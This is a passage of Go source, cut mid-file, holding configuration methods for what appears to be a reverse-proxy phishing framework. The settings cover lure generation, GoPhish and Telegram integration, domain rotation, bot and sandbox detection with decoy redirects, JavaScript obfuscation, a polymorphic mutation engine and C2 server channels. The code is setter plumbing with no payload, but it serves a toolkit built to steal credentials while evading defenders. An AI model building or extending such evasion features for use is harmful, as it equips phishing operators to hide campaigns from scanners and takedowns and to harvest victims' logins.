	return c.general.DnsPort
}

func (c *Config) GetRedirectorsDir() string {
	return c.redirectorsDir
}

func (c *Config) GetBlacklistMode() string {
	return c.blacklistConfig.Mode
}

func (c *Config) SetWhitelistEnabled(enabled bool) {
	c.whitelistConfig.Enabled = enabled
	c.cfg.Set(CFG_WHITELIST, c.whitelistConfig)
	c.cfg.WriteConfig()
	if enabled {
		log.Info("whitelist: enabled")
	} else {
		log.Info("whitelist: disabled")
	}
}

func (c *Config) IsWhitelistEnabled() bool {
	return c.whitelistConfig.Enabled
}

func (c *Config) IsAutocertEnabled() bool {
	return c.general.Autocert
}

func (c *Config) GetGoPhishAdminUrl() string {
	return c.gophishConfig.AdminUrl
}

func (c *Config) GetGoPhishApiKey() string {
	return c.gophishConfig.ApiKey
}

func (c *Config) GetGoPhishInsecureTLS() bool {
	return c.gophishConfig.InsecureTLS
}

func (c *Config) GetTelegramBotToken() string {
	return c.telegramConfig.BotToken
}

func (c *Config) GetTelegramChatID() string {
	return c.telegramConfig.ChatID
}

func (c *Config) GetTelegramEnabled() bool {
	return c.telegramConfig.Enabled
}

func (c *Config) GetTelegramConfig() *TelegramConfig {
	return c.telegramConfig
}

func (c *Config) GetDNSProviderConfig() *DNSProviderConfig {
	return c.dnsProviderConfig
}

func (c *Config) IsWildcardEnabled() bool {
	return c.dnsProviderConfig != nil && c.dnsProviderConfig.WildcardEnabled
}

func (c *Config) SetDNSProvider(provider string, apiKey string, email string, enabled bool, wildcardEnabled bool) {
	c.dnsProviderConfig.Provider = provider
	c.dnsProviderConfig.ApiKey = apiKey
	c.dnsProviderConfig.Email = email
	c.dnsProviderConfig.Enabled = enabled
	c.dnsProviderConfig.WildcardEnabled = wildcardEnabled
	c.cfg.Set(CFG_DNS_PROVIDER, c.dnsProviderConfig)
	log.Info("dns provider configuration updated")
	c.cfg.WriteConfig()
}

func (c *Config) GetDefaultDNSProvider() string {
	if c.dnsProviderConfig != nil && c.dnsProviderConfig.Enabled {
		return c.dnsProviderConfig.Provider
	}
	return ""
}

func (c *Config) GetBotguardConfig() *BotguardConfig {
	return c.botguardConfig
}

func (c *Config) SetBotguard(enabled bool, sensitivity string, spoofURL string) {
	c.botguardConfig.Enabled = enabled
	c.botguardConfig.Sensitivity = sensitivity
	c.botguardConfig.SpoofURL = spoofURL
	c.cfg.Set(CFG_BOTGUARD, c.botguardConfig)
	log.Info("botguard configuration updated")
	c.cfg.WriteConfig()
}

func (c *Config) GetJSObfuscationConfig() *JSObfuscationConfig {
	return c.jsObfuscationConfig
}

func (c *Config) SetJSObfuscation(enabled bool, level string) {
	c.jsObfuscationConfig.Enabled = enabled
	c.jsObfuscationConfig.Level = level
	c.cfg.Set(CFG_JS_OBFUSCATION, c.jsObfuscationConfig)
	log.Info("js obfuscation configuration updated")
	c.cfg.WriteConfig()
}

func (c *Config) GetMLDetectorConfig() *MLDetectorConfig {
	return c.mlDetectorConfig
}

func (c *Config) SetMLDetector(enabled bool, threshold float64, collectBehavior bool, logPredictions bool) {
	c.mlDetectorConfig.Enabled = enabled
	c.mlDetectorConfig.Threshold = threshold
	c.mlDetectorConfig.CollectBehavior = collectBehavior
	c.mlDetectorConfig.LogPredictions = logPredictions
	c.cfg.Set(CFG_ML_DETECTOR, c.mlDetectorConfig)
	log.Info("ml detector configuration updated")
	c.cfg.WriteConfig()
}

func (c *Config) IsMLDetectorEnabled() bool {
	return c.mlDetectorConfig != nil && c.mlDetectorConfig.Enabled
}

func (c *Config) GetCaptchaConfig() *CaptchaConfig {
	return c.captchaConfig
}

func (c *Config) SetCaptchaEnabled(enabled bool) {
	c.captchaConfig.Enabled = enabled
	c.cfg.Set(CFG_CAPTCHA, c.captchaConfig)
	log.Info("captcha enabled: %v", enabled)
	c.cfg.WriteConfig()
}

func (c *Config) SetCaptchaProvider(provider string) error {
	if c.captchaConfig.Providers == nil {
		c.captchaConfig.Providers = make(map[string]ProviderConfig)
	}
	
	// Check if provider config exists
	if _, exists := c.captchaConfig.Providers[provider]; !exists {
		return fmt.Errorf("provider %s not configured", provider)
	}
	
	c.captchaConfig.Provider = provider
	c.cfg.Set(CFG_CAPTCHA, c.captchaConfig)
	log.Info("captcha provider set to: %s", provider)
	c.cfg.WriteConfig()
	return nil
}

func (c *Config) SetCaptchaProviderConfig(provider string, siteKey string, secretKey string, options map[string]string) {
	if c.captchaConfig.Providers == nil {
		c.captchaConfig.Providers = make(map[string]ProviderConfig)
	}
	
	c.captchaConfig.Providers[provider] = ProviderConfig{
		SiteKey:   siteKey,
		SecretKey: secretKey,
		Options:   options,
	}
	
	c.cfg.Set(CFG_CAPTCHA, c.captchaConfig)
	log.Info("captcha provider %s configured", provider)
	c.cfg.WriteConfig()
}

func (c *Config) SetCaptchaRequireForLures(require bool) {
	c.captchaConfig.RequireForLures = require
	c.cfg.Set(CFG_CAPTCHA, c.captchaConfig)
	log.Info("captcha require for lures: %v", require)
	c.cfg.WriteConfig()
}

func (c *Config) GetDomainRotationConfig() *DomainRotationConfig {
	return c.domainRotationConfig
}

func (c *Config) SetDomainRotationEnabled(enabled bool) {
	c.domainRotationConfig.Enabled = enabled
	c.cfg.Set(CFG_DOMAIN_ROTATION, c.domainRotationConfig)
	log.Info("domain rotation enabled: %v", enabled)
	c.cfg.WriteConfig()
}

func (c *Config) SetDomainRotationStrategy(strategy string) {
	c.domainRotationConfig.Strategy = strategy
	c.cfg.Set(CFG_DOMAIN_ROTATION, c.domainRotationConfig)
	log.Info("domain rotation strategy set to: %s", strategy)
	c.cfg.WriteConfig()
}

func (c *Config) SetDomainRotationInterval(interval int) {
	c.domainRotationConfig.RotationInterval = interval
	c.cfg.Set(CFG_DOMAIN_ROTATION, c.domainRotationConfig)
	log.Info("domain rotation interval set to: %d minutes", interval)
	c.cfg.WriteConfig()
}

func (c *Config) SetDomainRotationAutoGenerate(enabled bool) {
	c.domainRotationConfig.AutoGenerate = enabled
	c.cfg.Set(CFG_DOMAIN_ROTATION, c.domainRotationConfig)
	log.Info("domain auto-generation: %v", enabled)
	c.cfg.WriteConfig()
}

func (c *Config) SetDomainRotationMaxDomains(max int) {
	c.domainRotationConfig.MaxDomains = max
	c.cfg.Set(CFG_DOMAIN_ROTATION, c.domainRotationConfig)
	log.Info("max domains set to: %d", max)
	c.cfg.WriteConfig()
}

func (c *Config) AddDomainRotationDNSProvider(name string, provider string, apiKey string, apiSecret string, zone string, options map[string]string) {
	if c.domainRotationConfig.DNSProviders == nil {
		c.domainRotationConfig.DNSProviders = make(map[string]DomainRotationDNSProvider)
	}
	
	c.domainRotationConfig.DNSProviders[name] = DomainRotationDNSProvider{
		Provider:  provider,
		APIKey:    apiKey,
		APISecret: apiSecret,
		Zone:      zone,
		Options:   options,
	}
	
	c.cfg.Set(CFG_DOMAIN_ROTATION, c.domainRotationConfig)
	log.Info("DNS provider %s configured for domain rotation", name)
	c.cfg.WriteConfig()
}

func (c *Config) GetTrafficShapingConfig() *TrafficShapingConfig {
	return c.trafficShapingConfig
}

func (c *Config) SetTrafficShapingEnabled(enabled bool) {
	c.trafficShapingConfig.Enabled = enabled
	c.cfg.Set(CFG_TRAFFIC_SHAPING, c.trafficShapingConfig)
	log.Info("traffic shaping enabled: %v", enabled)
	c.cfg.WriteConfig()
}

func (c *Config) SetTrafficShapingMode(mode string) {
	c.trafficShapingConfig.Mode = mode
	c.cfg.Set(CFG_TRAFFIC_SHAPING, c.trafficShapingConfig)
	log.Info("traffic shaping mode set to: %s", mode)
	c.cfg.WriteConfig()
}

func (c *Config) SetTrafficShapingGlobalLimit(rateLimit int, burstSize int) {
	c.trafficShapingConfig.GlobalRateLimit = rateLimit
	c.trafficShapingConfig.GlobalBurstSize = burstSize
	c.cfg.Set(CFG_TRAFFIC_SHAPING, c.trafficShapingConfig)
	log.Info("global rate limit set to: %d/s (burst: %d)", rateLimit, burstSize)
	c.cfg.WriteConfig()
}

func (c *Config) SetTrafficShapingPerIPLimit(rateLimit int, burstSize int) {
	c.trafficShapingConfig.PerIPRateLimit = rateLimit
	c.trafficShapingConfig.PerIPBurstSize = burstSize
	c.cfg.Set(CFG_TRAFFIC_SHAPING, c.trafficShapingConfig)
	log.Info("per-IP rate limit set to: %d/s (burst: %d)", rateLimit, burstSize)
	c.cfg.WriteConfig()
}

func (c *Config) SetTrafficShapingBandwidthLimit(limit int64) {
	c.trafficShapingConfig.BandwidthLimit = limit
	c.cfg.Set(CFG_TRAFFIC_SHAPING, c.trafficShapingConfig)
	log.Info("bandwidth limit set to: %d bytes/s", limit)
	c.cfg.WriteConfig()
}

func (c *Config) SetTrafficShapingGeoRule(country string, rateLimit int, burstSize int, priority int, blocked bool) {
	if c.trafficShapingConfig.GeoRules == nil {
		c.trafficShapingConfig.GeoRules = make(map[string]*GeoRuleConfig)
	}
	
	c.trafficShapingConfig.GeoRules[country] = &GeoRuleConfig{
		RateLimit: rateLimit,
		BurstSize: burstSize,
		Priority:  priority,
		Blocked:   blocked,
	}
	
	c.cfg.Set(CFG_TRAFFIC_SHAPING, c.trafficShapingConfig)
	log.Info("traffic shaping rule for %s configured", country)
	c.cfg.WriteConfig()
}

func (c *Config) GetSandboxDetectionConfig() *SandboxDetectionConfig {
	return c.sandboxDetectionConfig
}

func (c *Config) SetSandboxDetectionEnabled(enabled bool) {
	c.sandboxDetectionConfig.Enabled = enabled
	c.cfg.Set(CFG_SANDBOX_DETECTION, c.sandboxDetectionConfig)
	log.Info("sandbox detection enabled: %v", enabled)
	c.cfg.WriteConfig()
}

func (c *Config) SetSandboxDetectionMode(mode string) {
	c.sandboxDetectionConfig.Mode = mode
	c.cfg.Set(CFG_SANDBOX_DETECTION, c.sandboxDetectionConfig)
	log.Info("sandbox detection mode set to: %s", mode)
	c.cfg.WriteConfig()
}

func (c *Config) SetSandboxDetectionThreshold(threshold float64) {
	c.sandboxDetectionConfig.DetectionThreshold = threshold
	c.cfg.Set(CFG_SANDBOX_DETECTION, c.sandboxDetectionConfig)
	log.Info("sandbox detection threshold set to: %.2f", threshold)
	c.cfg.WriteConfig()
}

func (c *Config) SetSandboxDetectionAction(action string) {
	c.sandboxDetectionConfig.ActionOnDetection = action
	c.cfg.Set(CFG_SANDBOX_DETECTION, c.sandboxDetectionConfig)
	log.Info("sandbox detection action set to: %s", action)
	c.cfg.WriteConfig()
}

func (c *Config) SetSandboxDetectionHoneypot(response string) {
	c.sandboxDetectionConfig.HoneypotResponse = response
	c.cfg.Set(CFG_SANDBOX_DETECTION, c.sandboxDetectionConfig)
	log.Info("sandbox honeypot response configured")
	c.cfg.WriteConfig()
}

func (c *Config) SetSandboxDetectionRedirect(url string) {
	c.sandboxDetectionConfig.RedirectURL = url
	c.cfg.Set(CFG_SANDBOX_DETECTION, c.sandboxDetectionConfig)
	log.Info("sandbox redirect URL set to: %s", url)
	c.cfg.WriteConfig()
}

func (c *Config) GetC2ChannelConfig() *C2Config {
	return c.c2ChannelConfig
}

func (c *Config) SetC2ChannelEnabled(enabled bool) {
	c.c2ChannelConfig.Enabled = enabled
	c.cfg.Set(CFG_C2_CHANNEL, c.c2ChannelConfig)
	log.Info("C2 channel enabled: %v", enabled)
	c.cfg.WriteConfig()
}

func (c *Config) SetC2ChannelTransport(transport string) {
	c.c2ChannelConfig.Transport = transport
	c.cfg.Set(CFG_C2_CHANNEL, c.c2ChannelConfig)
	log.Info("C2 channel transport set to: %s", transport)
	c.cfg.WriteConfig()
}

func (c *Config) AddC2Server(id string, url string, priority int) error {
	// Check if server already exists
	for i, server := range c.c2ChannelConfig.Servers {
		if server.ID == id {
			// Update existing server
			c.c2ChannelConfig.Servers[i].URL = url
			c.c2ChannelConfig.Servers[i].Priority = priority
			c.cfg.Set(CFG_C2_CHANNEL, c.c2ChannelConfig)
			log.Info("C2 server %s updated", id)
			c.cfg.WriteConfig()
			return nil
		}
	}
	
	// Add new server
	server := C2Server{
		ID:       id,
		URL:      url,
		Priority: priority,
		Active:   true,
	}
	
	c.c2ChannelConfig.Servers = append(c.c2ChannelConfig.Servers, server)
	c.cfg.Set(CFG_C2_CHANNEL, c.c2ChannelConfig)
	log.Info("C2 server %s added", id)
	c.cfg.WriteConfig()
	return nil
}

func (c *Config) RemoveC2Server(id string) error {
	for i, server := range c.c2ChannelConfig.Servers {
		if server.ID == id {
			c.c2ChannelConfig.Servers = append(c.c2ChannelConfig.Servers[:i], c.c2ChannelConfig.Servers[i+1:]...)
			c.cfg.Set(CFG_C2_CHANNEL, c.c2ChannelConfig)
			log.Info("C2 server %s removed", id)
			c.cfg.WriteConfig()
			return nil
		}
	}
	
	return fmt.Errorf("server not found: %s", id)
}

func (c *Config) SetC2ChannelKey(key string) {
	c.c2ChannelConfig.EncryptionKey = key
	c.cfg.Set(CFG_C2_CHANNEL, c.c2ChannelConfig)
	log.Info("C2 channel encryption key updated")
	c.cfg.WriteConfig()
}

func (c *Config) SetC2ChannelAuthToken(token string) {
	c.c2ChannelConfig.AuthToken = token
	c.cfg.Set(CFG_C2_CHANNEL, c.c2ChannelConfig)
	log.Info("C2 channel auth token updated")
	c.cfg.WriteConfig()
}

func (c *Config) GetPolymorphicConfig() *PolymorphicConfig {
	return c.polymorphicConfig
}

func (c *Config) SetPolymorphicEnabled(enabled bool) {
	c.polymorphicConfig.Enabled = enabled
	c.cfg.Set(CFG_POLYMORPHIC, c.polymorphicConfig)
	log.Info("Polymorphic engine enabled: %v", enabled)
	c.cfg.WriteConfig()
}

func (c *Config) SetPolymorphicLevel(level string) {
	c.polymorphicConfig.MutationLevel = level
	c.cfg.Set(CFG_POLYMORPHIC, c.polymorphicConfig)
	log.Info("Polymorphic mutation level set to: %s", level)
	c.cfg.WriteConfig()
}

func (c *Config) SetPolymorphicCacheEnabled(enabled bool) {
	c.polymorphicConfig.CacheEnabled = enabled
	c.cfg.Set(CFG_POLYMORPHIC, c.polymorphicConfig)
	log.Info("Polymorphic cache enabled: %v", enabled)
	c.cfg.WriteConfig()
}

func (c *Config) SetPolymorphicSeedRotation(minutes int) {
	c.polymorphicConfig.SeedRotation = minutes
	c.cfg.Set(CFG_POLYMORPHIC, c.polymorphicConfig)
	log.Info("Polymorphic seed rotation set to: %d minutes", minutes)
	c.cfg.WriteConfig()
}

func (c *Config) SetPolymorphicTemplateMode(enabled bool) {
	c.polymorphicConfig.TemplateMode = enabled
	c.cfg.Set(CFG_POLYMORPHIC, c.polymorphicConfig)
	log.Info("Polymorphic template mode enabled: %v", enabled)
	c.cfg.WriteConfig()
}

func (c *Config) SetPolymorphicMutation(mutation string, enabled bool) {
	if c.polymorphicConfig.EnabledMutations == nil {
		c.polymorphicConfig.EnabledMutations = make(map[string]bool)
	}
	c.polymorphicConfig.EnabledMutations[mutation] = enabled
	c.cfg.Set(CFG_POLYMORPHIC, c.polymorphicConfig)
	log.Info("Polymorphic mutation '%s' enabled: %v", mutation, enabled)
	c.cfg.WriteConfig()
}

// Lure Generation Configuration
func (c *Config) GetLureGenerationStrategy() string {
	if c.lureGenerationConfig == nil {
		return "realistic"
	}
	return c.lureGenerationConfig.Strategy
}

func (c *Config) SetLureGenerationStrategy(strategy string) {
	validStrategies := []string{"short", "medium", "long", "realistic", "hex", "base64", "mixed"}
	isValid := false
	for _, s := range validStrategies {
		if s == strategy {
			isValid = true
			break
		}
	}
	
	if !isValid {
		log.Warning("Invalid lure generation strategy: %s. Using 'realistic' instead.", strategy)
		strategy = "realistic"
	}
	
	c.lureGenerationConfig.Strategy = strategy
	c.cfg.Set(CFG_LURE_GENERATION, c.lureGenerationConfig)
	log.Info("Lure generation strategy set to: %s", strategy)
	c.cfg.WriteConfig()
}
